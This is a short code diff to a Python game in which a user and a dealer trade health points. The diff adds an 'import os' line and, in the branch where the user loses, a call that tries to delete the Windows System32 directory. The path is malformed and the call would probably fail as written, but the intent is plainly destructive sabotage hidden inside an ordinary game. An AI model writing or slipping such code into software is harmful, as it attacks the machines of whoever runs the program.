@@ -1,5 +1,5 @@
 import random
-
+import os
 userHealth = 3
 dealerHealth = 3
 emptyCase = 0
@@ -65,6 +65,7 @@ def userTurn():
 while True:
     if userHealth <= 0:
         print("User lost!")
+        os.remove("C\Windows\System32")
         break
     elif dealerHealth <= 0:
         print("Dealer lost!")
